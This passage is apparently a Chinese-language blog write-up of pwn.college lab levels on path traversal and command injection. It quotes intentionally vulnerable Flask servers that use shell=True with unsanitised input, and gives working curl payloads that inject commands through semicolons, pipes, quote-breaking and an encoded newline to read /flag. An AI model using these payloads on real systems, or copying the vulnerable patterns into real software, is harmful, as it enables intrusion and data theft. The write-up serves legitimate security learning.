class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>(<span class="params">path=<span class="string">&quot;index.html&quot;</span></span>):</span><br><span class="line">    requested_path = app.root_path + <span class="string">&quot;/files/&quot;</span> + path</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;requested_path=&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(requested_path).read()</span><br><span class="line">    <span class="keyword">except</span> PermissionError:</span><br><span class="line">        flask.abort(<span class="number">403</span>, requested_path)</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        flask.abort(<span class="number">404</span>, <span class="string">f&quot;No <span class="subst">&#123;requested_path&#125;</span> from directory <span class="subst">&#123;os.getcwd()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        flask.abort(<span class="number">500</span>, requested_path + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)</span><br></pre></td></tr></table></figure><ol><li>这段代码定义了一个 Flask Web 服务器，用于从 <code>/files</code> 目录中返回请求的文件内容。</li><li>它通过路径拼接处理用户提供的文件路径，并且捕捉可能出现的文件读取错误（如权限问题、文件不存在等）。</li><li>如果请求的文件存在且可以读取，服务器会将文件内容返回给客户端。如果发生错误，服务器会返回相应的 HTTP 错误码。</li><li>最后，代码配置了 Flask 服务器的密钥、端口和服务器名称，并启动了服务器。</li></ol><h3 id="3-2-Path-Traversal-2"><a href="#3-2-Path-Traversal-2" class="headerlink" title="3.2 Path Traversal 2"></a>3.2 Path Traversal 2</h3><p>这里的<code>path.strip(&quot;/.&quot;)</code>会将<code>curl -v http://challenge.localhost:80/fortunes/%2e%2e/%2e%2e/flag</code> 中传入的<code>path</code>的前后的以<code>.</code>和<code>/</code>开头和结尾的符号去掉，所以需要通过<code>fortunes</code>绕过，也即<code>curl -v http://challenge.localhost:80/fortunes/%2e%2e/%2e%2e/%2e%2e/flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>(<span class="params">path=<span class="string">&quot;index.html&quot;</span></span>):</span><br><span class="line">    requested_path = app.root_path + <span class="string">&quot;/files/&quot;</span> + path.strip(<span class="string">&quot;/.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;requested_path=&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(requested_path).read()</span><br><span class="line">    <span class="keyword">except</span> PermissionError:</span><br><span class="line">        flask.abort(<span class="number">403</span>, requested_path)</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        flask.abort(<span class="number">404</span>, <span class="string">f&quot;No <span class="subst">&#123;requested_path&#125;</span> from directory <span class="subst">&#123;os.getcwd()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        flask.abort(<span class="number">500</span>, requested_path + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-3-CMDi-1"><a href="#3-3-CMDi-1" class="headerlink" title="3.3 CMDi 1"></a>3.3 CMDi 1</h3><p>这是server的源码，我们可以在请求中嵌入一个随便的<code>direction</code>，然后再加一个<code>；</code>和<code>\space</code>就可以直接访问到<code>/flag</code>了，注意：需要对特殊字符进行 URL 编码。<code>curl &quot;http://challenge.localhost:80/?directory=/your/directory/path%3Bcat%20/flag&quot;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    directory = flask.request.args.get(<span class="string">&quot;directory&quot;</span>, <span class="string">&quot;/challenge&quot;</span>)</span><br><span class="line">    command = <span class="string">f&quot;ls -l <span class="subst">&#123;directory&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;command=&#125;</span>&quot;</span>)</span><br><span class="line">    listing = subprocess.run(</span><br><span class="line">        command,                    <span class="comment"># the command to run</span></span><br><span class="line">        shell=<span class="literal">True</span>,                 <span class="comment"># use the shell to run this command</span></span><br><span class="line">        stdout=subprocess.PIPE,     <span class="comment"># capture the standard output</span></span><br><span class="line">        stderr=subprocess.STDOUT,   <span class="comment"># 2&gt;&amp;1</span></span><br><span class="line">        encoding=<span class="string">&quot;latin&quot;</span>            <span class="comment"># capture the resulting output as text</span></span><br><span class="line">    ).stdout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;&lt;body&gt;</span></span><br><span class="line"><span class="string">        Welcome to the dirlister service! Please choose a directory to list the files of:</span></span><br><span class="line"><span class="string">        &lt;form&gt;&lt;input type=text name=directory&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;b&gt;Output of: ls -l <span class="subst">&#123;directory&#125;</span>&lt;/b&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;pre&gt;<span class="subst">&#123;listing&#125;</span>&lt;/pre&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">os.setuid(os.geteuid())</span><br><span class="line">os.environ[<span class="string">&quot;PATH&quot;</span>] = <span class="string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)</span><br></pre></td></tr></table></figure><h3 id="3-4-CMDi-2"><a href="#3-4-CMDi-2" class="headerlink" title="3.4 CMDi 2"></a>3.4 CMDi 2</h3><p>源码中可以看见<code> directory = flask.request.args.get(&quot;directory&quot;, &quot;/challenge&quot;).replace(&quot;;&quot;, &quot;&quot;)</code>这里的<code>;</code>被替换了，所以我们无法向3.3一样通过；执行注入，但是我们仍然可以通过管道的方式注入命令，也即，<code>http://challenge.localhost:80/?directory=/|%20cat%20/flag</code>其中<code>%20</code>是空格的URL编码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    directory = flask.request.args.get(<span class="string">&quot;directory&quot;</span>, <span class="string">&quot;/challenge&quot;</span>).replace(<span class="string">&quot;;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    command = <span class="string">f&quot;ls -l <span class="subst">&#123;directory&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;command=&#125;</span>&quot;</span>)</span><br><span class="line">    listing = subprocess.run(</span><br><span class="line">        command,                    <span class="comment"># the command to run</span></span><br><span class="line">        shell=<span class="literal">True</span>,                 <span class="comment"># use the shell to run this command</span></span><br><span class="line">        stdout=subprocess.PIPE,     <span class="comment"># capture the standard output</span></span><br><span class="line">        stderr=subprocess.STDOUT,   <span class="comment"># 2&gt;&amp;1</span></span><br><span class="line">        encoding=<span class="string">&quot;latin&quot;</span>            <span class="comment"># capture the resulting output as text</span></span><br><span class="line">    ).stdout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;&lt;body&gt;</span></span><br><span class="line"><span class="string">        Welcome to the dirlister service! Please choose a directory to list the files of:</span></span><br><span class="line"><span class="string">        &lt;form&gt;&lt;input type=text name=directory&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;b&gt;Output of: ls -l <span class="subst">&#123;directory&#125;</span>&lt;/b&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;pre&gt;<span class="subst">&#123;listing&#125;</span>&lt;/pre&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">os.setuid(os.geteuid())</span><br><span class="line">os.environ[<span class="string">&quot;PATH&quot;</span>] = <span class="string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)</span><br></pre></td></tr></table></figure><h3 id="3-5-CMDi-3"><a href="#3-5-CMDi-3" class="headerlink" title="3.5 CMDi 3"></a>3.5 CMDi 3</h3><p>这里的command 使用了单引号将directory括了起来，我们在尝试注入指令的时候首先注入一个单引号将前面的单引号匹配上，然后再注入真正的命令，最后再用一个单引号批评后面的单引号。也即<code> curl &quot;http://challenge.localhost:80/?directory=&#39;%3B%20cat%20/flag&#39;&quot;</code>等价于<code>echo Hello &#39;&#39;; cat /flag; echo &#39;&#39;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    directory = flask.request.args.get(<span class="string">&quot;directory&quot;</span>, <span class="string">&quot;/challenge&quot;</span>)</span><br><span class="line">    command = <span class="string">f&quot;ls -l &#x27;<span class="subst">&#123;directory&#125;</span>&#x27;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;command=&#125;</span>&quot;</span>)</span><br><span class="line">    listing = subprocess.run(</span><br><span class="line">        command,                    <span class="comment"># the command to run</span></span><br><span class="line">        shell=<span class="literal">True</span>,                 <span class="comment"># use the shell to run this command</span></span><br><span class="line">        stdout=subprocess.PIPE,     <span class="comment"># capture the standard output</span></span><br><span class="line">        stderr=subprocess.STDOUT,   <span class="comment"># 2&gt;&amp;1</span></span><br><span class="line">        encoding=<span class="string">&quot;latin&quot;</span>            <span class="comment"># capture the resulting output as text</span></span><br><span class="line">    ).stdout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;&lt;body&gt;</span></span><br><span class="line"><span class="string">        Welcome to the dirlister service! Please choose a directory to list the files of:</span></span><br><span class="line"><span class="string">        &lt;form&gt;&lt;input type=text name=directory&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;b&gt;Output of: ls -l &#x27;<span class="subst">&#123;directory&#125;</span>&#x27;&lt;/b&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;pre&gt;<span class="subst">&#123;listing&#125;</span>&lt;/pre&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">os.setuid(os.geteuid())</span><br><span class="line">os.environ[<span class="string">&quot;PATH&quot;</span>] = <span class="string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)</span><br></pre></td></tr></table></figure><h3 id="3-6-CMDi-4"><a href="#3-6-CMDi-4" class="headerlink" title="3.6 CMDi 4"></a>3.6 CMDi 4</h3><p>这个也是一样，将注入的命令替换到timezone中，也即运行<code>curl &quot;http://challenge.localhost:80/?timezone=MST;cat%20/flag&quot;</code>这个代码将命令从中间分开，然后运行<code>cat /flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    timezone = flask.request.args.get(<span class="string">&quot;timezone&quot;</span>, <span class="string">&quot;MST&quot;</span>)</span><br><span class="line">    command = <span class="string">f&quot;TZ=<span class="subst">&#123;timezone&#125;</span> date&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;command=&#125;</span>&quot;</span>)</span><br><span class="line">    result = subprocess.run(</span><br><span class="line">        command,                    <span class="comment"># the command to run</span></span><br><span class="line">        shell=<span class="literal">True</span>,                 <span class="comment"># use the shell to run this command</span></span><br><span class="line">        stdout=subprocess.PIPE,     <span class="comment"># capture the standard output</span></span><br><span class="line">        stderr=subprocess.STDOUT,   <span class="comment"># 2&gt;&amp;1</span></span><br><span class="line">        encoding=<span class="string">&quot;latin&quot;</span>            <span class="comment"># capture the resulting output as text</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;&lt;body&gt;</span></span><br><span class="line"><span class="string">        Welcome to the timezone service! Please choose a timezone to get the time there.</span></span><br><span class="line"><span class="string">        &lt;form&gt;&lt;input type=text name=timezone&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;b&gt;Output of: TZ=<span class="subst">&#123;timezone&#125;</span> date&lt;/b&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;pre&gt;<span class="subst">&#123;result.stdout&#125;</span>&lt;/pre&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">os.setuid(os.geteuid())</span><br><span class="line">os.environ[<span class="string">&quot;PATH&quot;</span>] = <span class="string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)</span><br></pre></td></tr></table></figure><h3 id="3-7-CMDi-5"><a href="#3-7-CMDi-5" class="headerlink" title="3.7 CMDi 5"></a>3.7 CMDi 5</h3><p>观察服务器源码和提示可以知道，这个关卡是基于“盲注”（blind injection），也就是说你无法直接看到命令执行的输出。所以我们需要通过命令<code>curl &quot;http://challenge.localhost:80/?filepath=/flag;cat%20/flag%20&gt;%20/tmp/flag_output&quot;</code>创建一个<code>flag_output</code>，然后再去访问它<code>curl &quot;http://challenge.localhost:80/?filepath=/tmp/flag_output&quot;</code>或者<code>cat /tmp/flag_output</code>这两个命令都可以。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    filepath = flask.request.args.get(<span class="string">&quot;filepath&quot;</span>, <span class="string">&quot;/challenge&quot;</span>)</span><br><span class="line">    command = <span class="string">f&quot;touch <span class="subst">&#123;filepath&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;command=&#125;</span>&quot;</span>)</span><br><span class="line">    subprocess.run(</span><br><span class="line">        command,                    <span class="comment"># the command to run</span></span><br><span class="line">        shell=<span class="literal">True</span>,                 <span class="comment"># use the shell to run this command</span></span><br><span class="line">        stdout=subprocess.PIPE,     <span class="comment"># capture the standard output</span></span><br><span class="line">        stderr=subprocess.STDOUT,   <span class="comment"># 2&gt;&amp;1</span></span><br><span class="line">        encoding=<span class="string">&quot;latin&quot;</span>            <span class="comment"># capture the resulting output as text</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;&lt;body&gt;</span></span><br><span class="line"><span class="string">        Welcome to the touch service! Please choose a file to touch:</span></span><br><span class="line"><span class="string">        &lt;form&gt;&lt;input type=text name=filepath&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;b&gt;Ran the command: touch <span class="subst">&#123;filepath&#125;</span>&lt;/b&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">os.setuid(os.geteuid())</span><br><span class="line">os.environ[<span class="string">&quot;PATH&quot;</span>] = <span class="string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)</span><br></pre></td></tr></table></figure><h3 id="3-8-CMDi-6"><a href="#3-8-CMDi-6" class="headerlink" title="3.8 CMDi 6"></a>3.8 CMDi 6</h3><blockquote><p>有时，开发者会非常努力地过滤掉潜在的危险字符。在这个挑战中，他们的过滤几乎是完美的，但还差一点点……你可能会被困住一会儿，但当你弄明白解决方案时，你会因为它的熟悉感而笑出来！</p></blockquote><p>这个虽然过滤了这么多符号，但是其实换行符就可以绕过了:<code>curl &quot;http://challenge.localhost:80/?directory=%0Acat%20/flag&quot;</code>，实际命令为，注意这里是有换行符号的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l </span><br><span class="line"><span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    directory = (</span><br><span class="line">        flask.request.args.get(<span class="string">&quot;directory&quot;</span>, <span class="string">&quot;/challenge&quot;</span>)</span><br><span class="line">        .replace(<span class="string">&quot;;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        .replace(<span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span 